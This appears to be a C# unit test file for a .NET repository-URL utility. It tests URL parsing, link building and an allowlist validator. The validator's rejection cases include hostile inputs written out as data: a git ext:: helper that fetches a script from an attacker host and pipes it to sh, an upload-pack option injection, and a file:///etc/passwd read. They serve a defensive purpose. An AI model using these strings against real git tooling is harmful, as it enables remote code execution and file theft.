// Licensed to the .NET Foundation under one or more agreements.
// The .NET Foundation licenses this file to you under the MIT license.

using AwesomeAssertions;
using Maestro.Common;

namespace Maestro.Common.Tests;

[TestFixture]
public class GitRepoUrlUtilsTests
{
    [Test]
    public void ParseGitHubUrlTest()
    {
        var gitHubUrl = "https://github.com/org/repo.name";
        var (name, org) = GitRepoUrlUtils.GetRepoNameAndOwner(gitHubUrl);
        name.Should().Be("repo.name");
        org.Should().Be("org");
    }

    [Test]
    public void ParseAzureDevOpsUrlTest()
    {
        var url = "https://dev.azure.com/dnceng/internal/_git/org-repo-name";
        var (name, org) = GitRepoUrlUtils.GetRepoNameAndOwner(url);
        name.Should().Be("repo-name");
        org.Should().Be("org");
    }

    [Test]
    public void ParseAzureDevOpsOtherFormUrlTest()
    {
        var url = "https://dnceng@dev.azure.com/dnceng/someproject/_git/org-repo-name";
        var (name, org) = GitRepoUrlUtils.GetRepoNameAndOwner(url);
        name.Should().Be("repo-name");
        org.Should().Be("org");
    }

    [Test]
    public void ParseVisualStudioUrlTest()
    {
        var url = "https://dnceng.visualstudio.com/internal/_git/org-repo-name";
        var (name, org) = GitRepoUrlUtils.GetRepoNameAndOwner(url);
        name.Should().Be("repo-name");
        org.Should().Be("org");
    }

    [Test]
    public void GitRepoTypeOrdering()
    {
        var repos = new (string Name, string Uri)[]
        {
            ("azdo", "https://dev.azure.com/dnceng/internal/_git/test-repo"),
            ("github1", "https://github.com/dotnet/test-repo"),
            ("github2", "https://github.com/dotnet/test-repo"),
            ("local", "/var/test-repo"),
        };

        var sorted = repos
            .OrderBy(r => GitRepoUrlUtils.ParseTypeFromUri(r.Uri), Comparer<GitRepoType>.Create(GitRepoUrlUtils.OrderByLocalPublicOther))
            .Select(r => r.Name)
            .ToArray();

        sorted.Should().ContainInConsecutiveOrder("local", "github1", "github2", "azdo");
    }

    [Test]
    [TestCase("https://dev.azure.com/dnceng/internal/_git/org-repo-name", "https://github.com/org/repo-name")]
    [TestCase("https://github.com/org/repo-name", "https://github.com/org/repo-name")]
    [TestCase("https://dev.azure.com/devdiv/DevDiv/_git/NuGet-NuGet.Client-Trusted", "https://github.com/NuGet/NuGet.Client")]
    public void ConvertInternalUriToPublicTest(string internalUri, string publicUri)
    {
        GitRepoUrlUtils.ConvertInternalUriToPublic(internalUri).Should().Be(publicUri);
    }

    [Test]
    [TestCase("https://github.com/dotnet/aspnetcore", "main", "https://github.com/dotnet/aspnetcore/tree/main")]
    [TestCase("https://github.com/dotnet/aspnetcore", "release/8.0", "https://github.com/dotnet/aspnetcore/tree/release/8.0")]
    [TestCase("https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore", "main", "https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore?version=GBmain")]
    [TestCase("https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore", "release/8.0", "https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore?version=GBrelease/8.0")]
    public void GetRepoAtBranchUriTest(string repoUri, string branch, string expectedUri)
    {
        GitRepoUrlUtils.GetRepoAtBranchUri(repoUri, branch).Should().Be(expectedUri);
    }

    [Test]
    [TestCase("https://github.com/dotnet/aspnetcore", "abc123", "https://github.com/dotnet/aspnetcore/commit/abc123")]
    [TestCase("https://github.com/dotnet/aspnetcore", "def456789", "https://github.com/dotnet/aspnetcore/commit/def456789")]
    [TestCase("https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore", "abc123", "https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore?_a=history&version=GCabc123")]
    [TestCase("https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore", "def456789", "https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore?_a=history&version=GCdef456789")]
    public void GetCommitLinkUriTest(string repoUri, string commit, string expectedUri)
    {
        GitRepoUrlUtils.GetCommitUri(repoUri, commit).Should().Be(expectedUri);
    }

    [Test]
    [TestCase("https://api.github.com/repos/dotnet/dotnet/pulls/3205", "https://github.com/dotnet/dotnet/pull/3205")]
    [TestCase("https://api.github.com/repos/dotnet/runtime/pulls/12345", "https://github.com/dotnet/runtime/pull/12345")]
    [TestCase("https://api.github.com/repos/microsoft/CsWinRT/pulls/999", "https://github.com/microsoft/CsWinRT/pull/999")]
    public void TurnApiUrlToWebsite_ConvertsGitHubApiUrlsToWebUrls(string apiUrl, string expectedWebUrl)
    {
        var result = GitRepoUrlUtils.TurnApiUrlToWebsite(apiUrl);
        result.Should().Be(expectedWebUrl);
    }

    [Test]
    [TestCase("https://dev.azure.com/dnceng/7ea9116e-9fac-403d-b258-b31fcf1bb293/_apis/git/repositories/test-repo-guid/pullRequests/123",
              "https://dev.azure.com/dnceng/internal/_git/test-repo-guid/pullrequest/123")]
    public void TurnApiUrlToWebsite_ConvertsAzureDevOpsApiUrlsToWebUrls(string apiUrl, string expectedWebUrl)
    {
        var result = GitRepoUrlUtils.TurnApiUrlToWebsite(apiUrl);
        result.Should().Be(expectedWebUrl);
    }

    [Test]
    [TestCase("https://github.com/dotnet/dotnet/pull/3205")]
    [TestCase("https://dev.azure.com/dnceng/internal/_git/dotnet-wpf/pullrequest/123")]
    [TestCase("not-a-url")]
    public void TurnApiUrlToWebsite_ReturnsOriginalUrlWhenNotApiUrl(string url)
    {
        var result = GitRepoUrlUtils.TurnApiUrlToWebsite(url);
        result.Should().Be(url);
    }

    [Test]
    [TestCase("https://github.com/dotnet/aspnetcore")]
    [TestCase("https://github.com/dotnet/aspnetcore.git")]
    [TestCase("https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore")]
    [TestCase("https://dnceng@dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore")]
    [TestCase("https://dnceng.visualstudio.com/internal/_git/dotnet-aspnetcore")]
    public void IsValidRemoteRepoUri_AcceptsGitHubAndAzureDevOpsHttpsUrls(string uri)
    {
        GitRepoUrlUtils.IsValidRemoteRepoUri(uri).Should().BeTrue();
    }

    [Test]
    // git transport-helper abuse (RCE)
    [TestCase("ext::sh -c curl% -s% http://attacker/p|sh")]
    [TestCase("fd::17/foo")]
    [TestCase("ext::git-upload-pack")]
    // scp-like SSH URL (SSH-SSRF)
    [TestCase("git@github.com:dotnet/aspnetcore.git")]
    [TestCase("user@attacker.internal:repo.git")]
    // option injection (URL parsed as a git option)
    [TestCase("--upload-pack=touch /tmp/pwned")]
    [TestCase("-oProxyCommand=evil")]
    // disallowed schemes / hosts
    [TestCase("file:///etc/passwd")]
    [TestCase("http://github.com/dotnet/aspnetcore")]
    [TestCase("ssh://git@github.com/dotnet/aspnetcore")]
    [TestCase("git://github.com/dotnet/aspnetcore")]
    [TestCase("https://attacker.com/dotnet/aspnetcore")]
    // local paths
    [TestCase("/var/repos/aspnetcore")]
    [TestCase("../../some/relative/path")]
    [TestCase("")]
    public void IsValidRemoteRepoUri_RejectsDangerousOrNonAllowlistedUris(string uri)
    {
        GitRepoUrlUtils.IsValidRemoteRepoUri(uri).Should().BeFalse();
    }
}
